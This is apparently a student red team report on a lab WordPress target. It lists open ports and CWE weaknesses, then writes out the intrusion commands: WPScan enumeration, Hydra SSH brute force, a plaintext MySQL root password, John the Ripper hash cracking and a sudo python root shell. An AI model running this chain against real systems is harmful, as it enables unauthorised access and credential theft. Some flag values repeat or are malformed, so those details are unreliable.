# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Network Topology
![Network Topology](/Images/Final_project_top.JPG)

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sS 192.168.1.110
```
![Nmap Scan](/Images/NmapScan.png)


This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22	SSH
  - Port 80	http
  - Port 111	rpcbind
  - Port 139	netbios-ssn
  - Port 445	microsoft-ds

The following vulnerabilities were identified on each target:
- Target 1
  - CWE-200: Exposure of Sensitive Information to an Unauthorized Actor 
  - CWE-672: Operation on a Resource after Expiration or Release
  - CWE-521: Weak Password Requirements 
  - CWE-307: Improper Restriction of Excessive Authentication Attempts 
  - CWE-256: Unprotected Storage of Credentials
  - CWE-522: Insufficiently Protected Credentials
  - CWE-863: Incorrect Authorization Reverse shell vulnerability 

![SSHVuln](/Images/SSHVuln.png)

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: b9bbcb33ellb80be759c4e844862482d
    - **Exploit Used**
      - WPScan to enumerate users
        - wpscan --url 192.168.1.110/wordpress/ --enumerate u
        - ![WPScan](/Images/WPScan.png)
      - Use Hydra to crack michael's password or guess password
        - hydra -l michael -P /usr/shar/wordlists/rockyou.txt 192.168.1.110 ssh
        - ![Hydra](/Images/Hydra.PNG)
      - Use stolen credentials to SSH into michael's account
        - ssh michael@192.168.1.110
        - Password: michael
      - Search for Flag1
        - grep -rnw ./ -e 'flag1' 2>/dev/null
        - ![flag1](/Images/Flag1.PNG)

  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
    - **Exploit Used**
      - Search for Flag2 in /var/www
      - cd /var/www
      - grep -rnw ./ -e 'flag2' 2>/dev/null
      - ![flag2](/Images/Flag2.PNG)

  - `flag3.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
    - **Exploit Used**
      - Find plain text password my MySQL database
        - grep -rnw ./ -e 'password' 2>/dev/null
        - nano /var/www/html/wordpress/wp-config.php
        - ![PlaintextPW](/Images/PlaintextPW.PNG)
      - Access and search MySQL database for usernames and passwords
        - mysql -u root -p'R@3nSecurity'
        - ![My1](/Images/Mysql1.png)
        - ![My2](/Images/Mysql2.png)
        - select post_content from wp_posts
        - ![My3](/Images/Mysql3.png)

  - `flag4.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
    - **Exploit Used**
      - Find user hashed password
        - ![hash](/Images/HashPW.png)
      - Crack user hashed password with Jack the Ripper
        - Create a .txt file with the usernames and hash passwords
          - ![hashtxt](/Images/HashPWtext.png)
        - john hash_pw.txt
          - ![Cracked](/Images/Cracked.PNG)
      - Log in as Steven with cracked password
        - ![SSHSteven](/Images/SSHSteven.png)
      - Escalate to root
        - ![UserPrivilages](/Images/UserPrivilages.png)
        - sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
      - Search for flag4
        - find . -name flag4.txt
        - ![flag4](/Images/flag4.png)



